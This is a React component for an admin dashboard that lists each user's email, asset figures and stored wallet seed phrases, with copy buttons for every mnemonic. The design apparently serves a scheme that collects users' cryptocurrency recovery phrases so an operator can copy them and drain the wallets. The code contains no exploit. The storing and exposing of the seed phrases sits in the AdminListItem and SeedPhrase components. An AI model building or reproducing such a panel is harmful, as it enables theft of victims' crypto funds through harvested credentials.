import styled, { keyframes } from 'styled-components'
import { faCopy } from '@fortawesome/free-regular-svg-icons'
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome'
import { useState } from 'react'

const AdminListItem = ({user}) => {
    {/* Email, Mnemonic, UpdatedAT, firstAsset, myAssets, lastSentAmount */}
    
  return (
    <Wrapper>
        <Title>{user.email} <Copy icon={faCopy}/></Title>
        <SmallItems>
            <Assets color='accent'>First Asset: {user.firstAsset}</Assets>
            <Assets color='primary'>Assets: {user.myAssets}</Assets>
            <Assets color='secondary'>Last Sent: {user.lastSentAmount}</Assets>
        </SmallItems>
        {user.mnemonics.map((mnemonic, idx)=> 
            <SeedPhrase key={idx} mnemonic={mnemonic.mnemonic}/>)}
    </Wrapper>
  )
}

const SeedPhrase = ({mnemonic})=>{
    const [showCopied, setShowCopied] = useState(false)

    const handleCopy = (value)=>{
        navigator.clipboard.writeText(value)
        .then(() => {
            // Successfully copied to clipboard
            setShowCopied(true)
            setTimeout(()=>setShowCopied(false), 2000)
        })
        .catch((err) => {
            // Unable to copy to clipboard
            console.error('Unable to copy to clipboard', err);
        });
    }

    return(
        <Mnemonic > 
            {mnemonic} 
            <Copy onClick={()=>handleCopy(mnemonic)} icon={faCopy}/> 
            <ShowCopyText value={showCopied?'fallIn':'fallOut'}>Copied</ShowCopyText>
        </Mnemonic>
    )
}

const fallOut = keyframes`
    from {
        opacity: 1;
        transform: translateY(0);
    }

    to {
        opacity: 0;
        transform: translateY(20px);
    }
`
const fallIn = keyframes`
    from {
        opacity: 0;
        transform: translateY(20px);
    }

    to {
        opacity: 1;
        transform: translateY(0);
    }
`

const ShowCopyText = styled.span`
    position: absolute;
    top: 50%;
    right: 0;
    padding: 5px 10px;
    background: white;
    color: #22753e;
    margin-right: 2px;
    font-weight: 500;
    font-size: small;
    border-radius: 20px;
    transform: translateY(-50%);
    animation: ${({value})=>value==='fallIn'?fallIn:fallOut} 0.5s ease-out;
    animation-fill-mode: forwards;
`

const Wrapper = styled.div`
    display: flex;
    flex-direction: column;
    background: ${({theme})=>theme.colors.white};
    margin: 10px;
    padding: 0 10px 10px;
    border-radius: 10px 10px 0 0;
    row-gap: 10px;
    overflow: hidden;
`
const SmallItems = styled.div`
    display: flex;
    gap: 5px;
    flex-wrap: wrap;
    margin-bottom: 5px;
`
const Title = styled.h3`
    background: ${({theme, color})=>theme.colors.accent};
    margin: 0 -10px 0;
    padding: 15px 10px;
`
const Assets = styled.p`
    margin: 0;
    color: ${({theme})=>theme.colors.white};
    padding: 5px 10px;
    margin: 0;
    border-radius: 10px;
    background: ${({theme, color})=>theme.colors[color]};
`
const Mnemonic = styled.div`
    position: relative;
    padding: 5px;
    line-height: .5;
`
const Copy = styled(FontAwesomeIcon)`
    padding: 5px;
    margin-left: 5px;
`

export default AdminListItem